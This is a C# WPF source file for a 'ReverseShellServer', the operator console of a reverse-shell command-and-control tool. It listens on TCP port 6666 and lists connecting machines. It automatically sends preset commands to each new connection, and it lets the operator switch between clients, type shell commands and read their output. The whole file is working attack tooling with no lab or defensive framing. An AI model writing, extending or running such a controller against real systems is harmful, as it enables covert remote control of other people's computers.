using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ReverseShellServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        TcpServer tcpServer;
        CancellationTokenSource cancellationToken = new CancellationTokenSource();
        ObservableCollection<string> connectedClients = new ObservableCollection<string>();

        StreamWriter streamWriter;
        StreamReader streamReader;
        string activeEndpoint;

        public MainWindow()
        {
            InitializeComponent();

            tcpServer = new TcpServer(6666);

            tcpServer.StartListening(cancellationToken.Token);

            tcpServer.ClientConnectedEvent += HandleNewConnection;
            tcpServer.ClientDisconnectedEvent += HandleLostConnection;
            tcpServer.DataRecievedEvent += HandleRecievedData;

            ClientList.ItemsSource = connectedClients;


            Application.Current.Dispatcher.ShutdownStarted += (object sentder, EventArgs e) =>
            {
                cancellationToken.Cancel();
            };
        }

        private void HandleNewConnection(object sender, ClientConnectedArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                ClientNumLabel.Content = "Connected Clients: " + tcpServer.ClientMap.Count;
                string clientEndpoint = (sender as TcpClient).Client.RemoteEndPoint.ToString();
                connectedClients.Add(clientEndpoint);
                OutputConsole.AppendText("\n");
                OutputConsole.AppendText($"Client connected ({clientEndpoint})");

                if (activeEndpoint == null)
                {
                    activeEndpoint = clientEndpoint;
                    streamReader = new StreamReader((sender as TcpClient).GetStream());
                    streamWriter = new StreamWriter((sender as TcpClient).GetStream());
                } 
                
            });
            SendCommands(AutoCommandsConsole.Text);
        }

        private void HandleLostConnection(object sender, EventArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                ClientNumLabel.Content = "Connected Clients: " + tcpServer.ClientMap.Count;
                string clientEndpoint = (sender as TcpClient).Client.RemoteEndPoint.ToString();
                connectedClients.Remove(connectedClients.Where(i => i == clientEndpoint).Single());
                OutputConsole.AppendText($"\nClient disconnected ({clientEndpoint})");
            });
        }

        private void HandleRecievedData(object sender, DataRecievedArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
            //    string[] lines = OutputConsole.Line Lines;
                OutputConsole.AppendText("\n");
                OutputConsole.AppendText(e.Data);
                (OutputConsole.Parent as ScrollViewer).ScrollToBottom();
            });
        }
        private void SendCommands(string Command)
        {
            foreach (var client in tcpServer.ClientMap)
            {

                this.Dispatcher.Invoke(() => {
                    if (streamWriter != null)
                    {
                        streamWriter.WriteLine(Command);
                        streamWriter.Flush();
                        OutputConsole.AppendText("\n");
                        OutputConsole.AppendText($"$ {Command}");
                    }
                });

            }
        }
        private void SendMessage(object sender, RoutedEventArgs e)
        {
            string message = InputConsole.Text;
            SendCommands(message);
            InputConsole.Clear();
        }

        private void SelectClient(object sender, MouseButtonEventArgs e)
        {
            TextBlock clientBlock = sender as TextBlock;
            string endpoint = clientBlock.Text;

            Console.WriteLine($"Clicked on {endpoint}, active: {activeEndpoint}");

            if (endpoint != activeEndpoint)
            {
                TcpClient client = tcpServer.ClientMap[endpoint];
                activeEndpoint = endpoint;
                streamReader = new StreamReader(client.GetStream());
                streamWriter = new StreamWriter(client.GetStream());
                Console.WriteLine($"Switched to client {endpoint}");

                OutputConsole.AppendText("\n");
                OutputConsole.AppendText($"\nSwitched to client {endpoint}");
            }
            
        }

        private void InputConsole_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                SendMessage(sender, e);
                InputConsole.Focus();
            }
        }

        private void InputConsole_TextChanged(object sender, TextChangedEventArgs e)
        {

        }
    }
}
